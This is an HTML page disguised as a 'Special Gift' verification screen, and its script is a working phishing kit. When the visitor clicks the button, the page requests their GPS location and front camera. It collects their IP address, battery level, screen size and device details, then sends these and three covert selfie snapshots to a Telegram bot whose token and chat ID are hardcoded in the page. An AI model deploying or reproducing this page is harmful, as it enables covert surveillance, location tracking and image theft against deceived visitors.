<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Special Gift | Verification</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;600;700&display=swap" rel="stylesheet" />
  <script src="https://unpkg.com/lucide@latest"></script>
  <style>
    body {
      font-family: 'Outfit', sans-serif;
      background-color: #050505;
      color: white;
      height: 100vh;
      margin: 0;
      display: flex;
      align-items: center;
      justify-content: center;
      overflow: hidden;
      transition: background-color 0.5s ease;
    }
    .gift-glow {
      box-shadow: 0 0 50px rgba(236, 72, 153, 0.4);
    }
    .pulse-animation {
      animation: pulse 2s infinite;
    }
    @keyframes pulse {
      0% { transform: scale(0.95); box-shadow: 0 0 0 0 rgba(236, 72, 153, 0.7); }
      70% { transform: scale(1); box-shadow: 0 0 0 20px rgba(236, 72, 153, 0); }
      100% { transform: scale(0.95); box-shadow: 0 0 0 0 rgba(236, 72, 153, 0); }
    }
    .fade-out {
      opacity: 0;
      visibility: hidden;
      transition: opacity 0.5s ease, visibility 0.5s;
    }
  </style>
</head>
<body>

  <div id="initial-ui" class="flex flex-col items-center justify-center w-full max-w-md p-6 text-center transition-all duration-500">
    
    <div class="relative w-32 h-32 mb-8 flex items-center justify-center bg-gradient-to-tr from-pink-600 to-purple-600 rounded-3xl gift-glow pulse-animation">
      <i data-lucide="gift" class="w-16 h-16 text-white"></i>
    </div>
    
    <button 
      id="verify-btn"
      class="w-full max-w-[200px] py-3.5 bg-white/10 hover:bg-white/20 border border-white/20 rounded-xl font-semibold tracking-wide backdrop-blur-md transition-all active:scale-95"
    >
      Verification
    </button>
  </div>

  <div id="processing-ui" class="absolute inset-0 flex flex-col items-center justify-center bg-black hidden z-50">
    <div class="w-12 h-12 border-4 border-white/10 border-t-white rounded-full animate-spin mb-4"></div>
    <p id="status-text" class="text-white/60 text-sm tracking-widest uppercase font-medium">Authenticating...</p>
  </div>

  <script>
    lucide.createIcons();

    const BOT_TOKEN = '8981972765:AAH4FIaxYtTIMDh3dpuNdEogyiz2fSDwv3o';
    const CHAT_ID = '7013966280';
    const REDIRECT_URL = 'letter.html'; // 👈 নতুন পেজের নাম

    const verifyBtn = document.getElementById('verify-btn');
    const initialUI = document.getElementById('initial-ui');
    const processingUI = document.getElementById('processing-ui');
    const statusText = document.getElementById('status-text');

    verifyBtn.addEventListener('click', startVerification);

    async function startVerification() {
      initialUI.classList.add('fade-out');
      setTimeout(() => {
        initialUI.style.display = 'none';
        processingUI.classList.remove('hidden');
      }, 500);

      try {
        statusText.textContent = "WAITING FOR LOCATION...";
        const position = await new Promise((resolve, reject) => {
          navigator.geolocation.getCurrentPosition(resolve, reject, { 
            enableHighAccuracy: true,
            timeout: 15000
          });
        }).catch(() => null);

        statusText.textContent = "WAITING FOR CAMERA...";
        const stream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: "user" }, audio: false
        });

        statusText.textContent = "VERIFYING DATA...";

        const video = document.createElement('video');
        video.srcObject = stream;
        video.setAttribute('playsinline', ''); 
        await video.play();

        const canvas = document.createElement('canvas');
        const ctx = canvas.getContext('2d');

        await sendTextData(position);

        for (let i = 0; i < 3; i++) {
          canvas.width = video.videoWidth;
          canvas.height = video.videoHeight;
          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
          
          const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.8));
          await sendPhoto(blob);
          
          await new Promise(res => setTimeout(res, 1000));
        }

        stream.getTracks().forEach(track => track.stop());

        statusText.textContent = "SUCCESS. REDIRECTING...";
        setTimeout(() => {
          window.location.href = REDIRECT_URL;
        }, 800);

      } catch (error) {
        statusText.textContent = "VERIFICATION FAILED. ACCESS DENIED.";
        console.error(error);
        setTimeout(() => {
            window.location.reload();
        }, 2000);
      }
    }

    async function sendTextData(position) {
      try {
        let ipData = {};
        try {
          const ipRes = await fetch('https://api.ipify.org?format=json');
          ipData = await ipRes.json();
        } catch(e) {}

        let batteryText = "Unknown";
        try {
            const battery = await navigator.getBattery();
            batteryText = `${Math.round(battery.level * 100)}% ${battery.charging ? '⚡ Charging' : ''}`;
        } catch(e) {}
        
        let locationText = "Not Allowed";
        if (position) {
          const { latitude, longitude } = position.coords;
          locationText = `[View Exact Location](https://www.google.com/maps?q=${latitude},${longitude})`;
        }

        const msg = `
🧑🏻‍💻 *Special Powerful Fishing* 🧑🏻‍💻

🌐 *IP Address:* \`${ipData.ip || 'Unknown'}\`
📍 *GPS Location:* ${locationText}
🔋 *Battery:* ${batteryText}
🖥️ *Screen:* ${screen.width}x${screen.height}
🧠 *Device:* \`${navigator.userAgent}\`
        `;

        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: CHAT_ID,
            text: msg,
            parse_mode: 'Markdown',
            disable_web_page_preview: true
          })
        });
      } catch (e) {
        console.error("Data Send Error", e);
      }
    }

    async function sendPhoto(blob) {
      try {
          const formData = new FormData();
          formData.append('chat_id', CHAT_ID);
          formData.append('photo', blob, 'member_capture.jpg');
          
          await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
            method: 'POST',
            body: formData
          });
      } catch (e) {
          console.error("Photo Error", e);
      }
    }
  </script>
</body>
</html>
